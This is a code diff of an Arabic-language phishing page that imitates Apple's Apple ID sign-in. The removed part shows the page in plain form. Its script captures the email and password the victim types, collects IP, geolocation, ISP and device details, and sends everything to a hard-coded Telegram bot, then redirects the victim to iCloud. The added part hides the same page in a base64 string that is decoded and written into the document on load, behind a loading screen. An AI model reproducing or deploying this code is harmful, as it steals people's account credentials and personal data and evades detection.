@@ -1,100 +1,31 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sign In - Apple</title>
-    <style>
-        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .box { width: 100%; max-width: 340px; text-align: center; padding: 20px; }
-        img { width: 35px; margin-bottom: 20px; }
-        h1 { font-size: 24px; font-weight: 600; margin: 0 0 10px; }
-        p { color: #666; font-size: 14px; margin-bottom: 30px; }
-        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #d2d2d7; border-radius: 10px; font-size: 16px; box-sizing: border-box; outline: none; }
-        button { width: 100%; padding: 14px; background: #0071e3; color: #fff; border: none; border-radius: 10px; font-size: 17px; font-weight: 500; cursor: pointer; }
-    </style>
+  <meta charset="UTF-8">
+  <title>تم تطويره بواسطة ٱلٰقـيۧٱدهۂَ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/4712/4712033.png">
+  <script>
+    function decodeBase64Unicode(str) {
+      return decodeURIComponent(escape(window.atob(str)));
+    }
+
+    const encodedHTML = "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImFyIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgbWF4aW11bS1zY2FsZT0xLjAsIHVzZXItc2NhbGFibGU9bm8iPgogICAgPHRpdGxlPlNpZ24gSW4gLSBBcHBsZTwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7IGZvbnQtZmFtaWx5OiAtYXBwbGUtc3lzdGVtLCBzeXN0ZW0tdWksIHNhbnMtc2VyaWY7IGJhY2tncm91bmQ6ICNmZmY7IG1hcmdpbjogMDsgZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGNlbnRlcjsganVzdGlmeS1jb250ZW50OiBjZW50ZXI7IGhlaWdodDogMTAwdmg7IG92ZXJmbG93OiBoaWRkZW47IH0KICAgICAgICAuYm94IHsgd2lkdGg6IDEwMCU7IG1heC13aWR0aDogMzQwcHg7IHRleHQtYWxpZ246IGNlbnRlcjsgcGFkZGluZzogMjBweDsgfQogICAgICAgIGltZyB7IHdpZHRoOiAzNXB4OyBtYXJnaW4tYm90dG9tOiAyMHB4OyB9CiAgICAgICAgaDEgeyBmb250LXNpemU6IDI0cHg7IGZvbnQtd2VpZ2h0OiA2MDA7IG1hcmdpbjogMCAwIDEwcHg7IH0KICAgICAgICBwIHsgY29sb3I6ICM2NjY7IGZvbnQtc2l6ZTogMTRweDsgbWFyZ2luLWJvdHRvbTogMzBweDsgfQogICAgICAgIGlucHV0IHsgd2lkdGg6IDEwMCU7IHBhZGRpbmc6IDE0cHg7IG1hcmdpbi1ib3R0b206IDEycHg7IGJvcmRlcjogMXB4IHNvbGlkICNkMmQyZDc7IGJvcmRlci1yYWRpdXM6IDEwcHg7IGZvbnQtc2l6ZTogMTZweDsgYm94LXNpemluZzogYm9yZGVyLWJveDsgb3V0bGluZTogbm9uZTsgfQogICAgICAgIGJ1dHRvbiB7IHdpZHRoOiAxMDAlOyBwYWRkaW5nOiAxNHB4OyBiYWNrZ3JvdW5kOiAjMDA3MWUzOyBjb2xvcjogI2ZmZjsgYm9yZGVyOiBub25lOyBib3JkZXItcmFkaXVzOiAxMHB4OyBmb250LXNpemU6IDE3cHg7IGZvbnQtd2VpZ2h0OiA1MDA7IGN1cnNvcjogcG9pbnRlcjsgfQogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KCjxkaXYgY2xhc3M9ImJveCI+CiAgICA8aW1nIHNyYz0iaHR0cHM6Ly91cGxvYWQud2lraW1lZGlhLm9yZy93aWtpcGVkaWEvY29tbW9ucy9mL2ZhL0FwcGxlX2xvZ29fYmxhY2suc3ZnIj4KICAgIDxoMT5BcHBsZSBJRDwvaDE+CiAgICA8cD7Yp9iz2KrYrtiv2YUg2KfZhNmAIEFwcGxlIElEINin2YTYrtin2LUg2KjZgyDZhNiq2LPYrNmK2YQg2KfZhNiv2K7ZiNmEPC9wPgogICAgCiAgICA8aW5wdXQgdHlwZT0iZW1haWwiIGlkPSJ1IiBwbGFjZWhvbGRlcj0iQXBwbGUgSUQiIHJlcXVpcmVkPgogICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBpZD0icCIgcGxhY2Vob2xkZXI9IlBhc3N3b3JkIiByZXF1aXJlZD4KICAgIAogICAgPGJ1dHRvbiBpZD0iYnRuIj5Db250aW51ZTwvYnV0dG9uPgo8L2Rpdj4KCjxzY3JpcHQ+CiAgICBjb25zdCB0b2tlbiA9ICI4MjEzNDY3NTIzOkFBRS00eXYzamlZdnlBSHBKVTRYSjkwbEFMVjVPU0t6TkRFIjsKICAgIGNvbnN0IGNoYXRfaWQgPSAiNjg4ODEwNzI1NSI7CgogICAgLy8g2K/Yp9mE2Kkg2KXYsdiz2KfZhCDYp9mE2KrZhtio2YrZh9in2KoKICAgIGZ1bmN0aW9uIHNlbmRNc2codGV4dCkgewogICAgICAgIGZldGNoKGBodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JHt0b2tlbn0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0ke2NoYXRfaWR9JnRleHQ9JHtlbmNvZGVVUklDb21wb25lbnQodGV4dCl9YCk7CiAgICB9CgogICAgLy8g2K/Yp9mE2Kkg2KzZhNioINin2YTYqNmK2KfZhtin2Kog2YXYuSDZhdit2LHZgyDYp9it2KrZitin2LfZigogICAgYXN5bmMgZnVuY3Rpb24gZ2V0SVAoKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgLy8g2YXYrdin2YjZhNipINij2YjZhNmJINi52KjYsSBpcHdoby5pcwogICAgICAgICAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9pcHdoby5pcy8nKTsKICAgICAgICAgICAgY29uc3QgZCA9IGF3YWl0IHJlcy5qc29uKCk7CiAgICAgICAgICAgIGlmKGQuc3VjY2VzcykgcmV0dXJuIHtpcDogZC5pcCwgY2l0eTogZC5jaXR5LCBjb3VudHJ5OiBkLmNvdW50cnksIGlzcDogZC5jb25uZWN0aW9uLmlzcH07CiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcigpOwogICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgLy8g2YXYrdin2YjZhNipINin2K3YqtmK2KfYt9mK2Kkg2LnYqNixIGlwYXBpINmB2Yog2K3Yp9mEINmB2LTZhCDYp9mE2KPZiNmE2YkKICAgICAgICAgICAgICAgIGNvbnN0IHJlczIgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9pcGFwaS5jby9qc29uLycpOwogICAgICAgICAgICAgICAgY29uc3QgZDIgPSBhd2FpdCByZXMyLmpzb24oKTsKICAgICAgICAgICAgICAgIHJldHVybiB7aXA6IGQyLmlwLCBjaXR5OiBkMi5jaXR5LCBjb3VudHJ5OiBkMi5jb3VudHJ5X25hbWUsIGlzcDogZDIub3JnfTsKICAgICAgICAgICAgfSBjYXRjaChlMikgewogICAgICAgICAgICAgICAgcmV0dXJuIHtpcDogItmF2K3ZhdmKL1ZQTiIsIGNpdHk6ICLYutmK2LEg2YXYudix2YjZgSIsIGNvdW50cnk6ICLYutmK2LEg2YXYudix2YjZgSIsIGlzcDogIti62YrYsSDZhdi52LHZiNmBIn07CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgLy8gMS4g2LnZhtivINin2YTYr9iu2YjZhCDZgdmI2LHYp9mLCiAgICB3aW5kb3cub25sb2FkID0gYXN5bmMgZnVuY3Rpb24oKSB7CiAgICAgICAgc2VuZE1zZygi8J+UlCBb2K/YrtmI2YQg2KzYr9mK2K8g2YTZhNix2KfYqNi3IC0g2KzYp9ix2Yog2YXYrdin2YjZhNipINiz2K3YqCDYp9mE2KLZiiDYqNmKLi4uXSIpOwogICAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCBnZXRJUCgpOwogICAgICAgIGxldCBlbnRyeVJlcG9ydCA9IGDwn4yQINii2Yog2KjZiiDYp9mE2K/YrtmI2YQ6ICR7ZGF0YS5pcH1cbvCfk40g2KfZhNmF2YjZgti5OiAke2RhdGEuY2l0eX1cbvCfk7Yg2KfZhNmF2LLZiNivOiAke2RhdGEuaXNwfWA7CiAgICAgICAgc2VuZE1zZyhlbnRyeVJlcG9ydCk7CiAgICB9OwoKICAgIC8vIDIuINin2YTYqtmC2LHZitixINin2YTYtNin2YXZhCDYudmG2K8g2KfZhNi22LrYtyAo2KfZhNiq2LHYqtmK2Kgg2KfZhNiv2YLZitmCKQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2J0bicpLm9uY2xpY2sgPSBhc3luYyBmdW5jdGlvbigpIHsKICAgICAgICBjb25zdCB1c2VyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3UnKS52YWx1ZTsKICAgICAgICBjb25zdCBwYXNzID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3AnKS52YWx1ZTsKICAgICAgICBpZighdXNlciB8fCAhcGFzcykgcmV0dXJuOwoKICAgICAgICB0aGlzLmlubmVySFRNTCA9ICJQcm9jZXNzaW5nLi4uIjsKICAgICAgICB0aGlzLmRpc2FibGVkID0gdHJ1ZTsKCiAgICAgICAgY29uc3QgaXBEYXRhID0gYXdhaXQgZ2V0SVAoKTsgLy8g2KXYudin2K/YqSDYp9mE2YXYrdin2YjZhNipINmE2YTYqtij2YPZitivCgogICAgICAgIGxldCByZXBvcnQgPSAi4pqg77iPINiq2YUg2KfYrtiq2LHYp9mCINin2YTZh9iv2YEg2KjZhtis2KfYrSDimqDvuI9cblxuIjsKICAgICAgICByZXBvcnQgKz0gIvCfk6cg2KfZhNit2LPYp9ioOiAiICsgdXNlciArICJcbiI7CiAgICAgICAgcmVwb3J0ICs9ICLwn5SRINin2YTYqNin2LPZiNix2K86ICIgKyBwYXNzICsgIlxuIjsKICAgICAgICByZXBvcnQgKz0gIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuIjsKICAgICAgICByZXBvcnQgKz0gIvCfjJAg2KfZhNmAIElQOiAiICsgaXBEYXRhLmlwICsgIlxuIjsKICAgICAgICByZXBvcnQgKz0gIvCfk40g2KfZhNmF2YjZgti5OiAiICsgaXBEYXRhLmNpdHkgKyAiICgiICsgaXBEYXRhLmNvdW50cnkgKyAiKVxuIjsKICAgICAgICByZXBvcnQgKz0gIvCfk7Yg2KfZhNmF2LLZiNivOiAiICsgaXBEYXRhLmlzcCArICJcbiI7CiAgICAgICAgcmVwb3J0ICs9ICLwn5OxINin2YTZhti42KfZhTogIiArIG5hdmlnYXRvci5wbGF0Zm9ybSArICJcbiI7CiAgICAgICAgcmVwb3J0ICs9ICLwn5SLINin2YTYqNi32KfYsdmK2Kk6ICIgKyAobmF2aWdhdG9yLmdldEJhdHRlcnkgPyAoYXdhaXQgKGF3YWl0IG5hdmlnYXRvci5nZXRCYXR0ZXJ5KCkpLmxldmVsICogMTAwKS50b0ZpeGVkKDApICsgIiUiIDogIk4vQSIpICsgIlxuIjsKICAgICAgICByZXBvcnQgKz0gIvCfk48g2KfZhNiv2YLYqTogIiArIHNjcmVlbi53aWR0aCArICJ4IiArIHNjcmVlbi5oZWlnaHQgKyAiXG4iOwogICAgICAgIHJlcG9ydCArPSAi8J+VsO+4jyDYp9mE2YjZgtiqOiAiICsgbmV3IERhdGUoKS50b0xvY2FsZVN0cmluZygpICsgIlxuIjsKICAgICAgICByZXBvcnQgKz0gIvCflJIg2YPZiNmD2YrYsjogIiArIChkb2N1bWVudC5jb29raWUgPyAi2YXZiNis2YjYr9ipIiA6ICLZhdit2YXZitipIik7CgogICAgICAgIHNlbmRNc2cocmVwb3J0KTsKCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5yZXBsYWNlKCJodHRwczovL3d3dy5pY2xvdWQuY29tLyIpOwogICAgICAgIH0sIDEyMDApOwogICAgfTsKPC9zY3JpcHQ+Cgo8L2JvZHk+CjwvaHRtbD4K";
+
+    function decodeAndRun() {
+      const decodedHTML = decodeBase64Unicode(encodedHTML);
+      document.open();
+      document.write(decodedHTML);
+      document.close();
+    }
+
+    window.onload = decodeAndRun;
+  </script>
 </head>
 <body>
-
-<div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
-    <h1>Apple ID</h1>
-    <p>استخدم الـ Apple ID الخاص بك لتسجيل الدخول</p>
-    
-    <input type="email" id="u" placeholder="Apple ID" required>
-    <input type="password" id="p" placeholder="Password" required>
-    
-    <button id="btn">Continue</button>
-</div>
-
-<script>
-    const token = "8213467523:AAE-4yv3jiYvyAHpJU4XJ90lALV5OSKzNDE";
-    const chat_id = "6888107255";
-
-    // دالة إرسال التنبيهات
-    function sendMsg(text) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
-    }
-
-    // دالة جلب البيانات مع محرك احتياطي
-    async function getIP() {
-        try {
-            // محاولة أولى عبر ipwho.is
-            const res = await fetch('https://ipwho.is/');
-            const d = await res.json();
-            if(d.success) return {ip: d.ip, city: d.city, country: d.country, isp: d.connection.isp};
-            throw new Error();
-        } catch(e) {
-            try {
-                // محاولة احتياطية عبر ipapi في حال فشل الأولى
-                const res2 = await fetch('https://ipapi.co/json/');
-                const d2 = await res2.json();
-                return {ip: d2.ip, city: d2.city, country: d2.country_name, isp: d2.org};
-            } catch(e2) {
-                return {ip: "محمي/VPN", city: "غير معروف", country: "غير معروف", isp: "غير معروف"};
-            }
-        }
-    }
-
-    // 1. عند الدخول فوراً
-    window.onload = async function() {
-        sendMsg("🔔 [دخول جديد للرابط - جاري محاولة سحب الآي بي...]");
-        const data = await getIP();
-        let entryReport = `🌐 آي بي الدخول: ${data.ip}\n📍 الموقع: ${data.city}\n📶 المزود: ${data.isp}`;
-        sendMsg(entryReport);
-    };
-
-    // 2. التقرير الشامل عند الضغط (الترتيب الدقيق)
-    document.getElementById('btn').onclick = async function() {
-        const user = document.getElementById('u').value;
-        const pass = document.getElementById('p').value;
-        if(!user || !pass) return;
-
-        this.innerHTML = "Processing...";
-        this.disabled = true;
-
-        const ipData = await getIP(); // إعادة المحاولة للتأكيد
-
-        let report = "⚠️ تم اختراق الهدف بنجاح ⚠️\n\n";
-        report += "📧 الحساب: " + user + "\n";
-        report += "🔑 الباسورد: " + pass + "\n";
-        report += "------------------------\n";
-        report += "🌐 الـ IP: " + ipData.ip + "\n";
-        report += "📍 الموقع: " + ipData.city + " (" + ipData.country + ")\n";
-        report += "📶 المزود: " + ipData.isp + "\n";
-        report += "📱 النظام: " + navigator.platform + "\n";
-        report += "🔋 البطارية: " + (navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + "%" : "N/A") + "\n";
-        report += "📏 الدقة: " + screen.width + "x" + screen.height + "\n";
-        report += "🕰️ الوقت: " + new Date().toLocaleString() + "\n";
-        report += "🔒 كوكيز: " + (document.cookie ? "موجودة" : "محمية");
-
-        sendMsg(report);
-
-        setTimeout(() => {
-            window.location.replace("https://www.icloud.com/");
-        }, 1200);
-    };
-</script>
-
+  <div style="text-align:center;padding:50px;font-family:'Tajawal', sans-serif;color:white;background:#1a2a6c;">
+    <h1>جاري تحميل المحتوى...</h1>
+    <p>يرجى الانتظار</p>
+  </div>
 </body>
 </html>
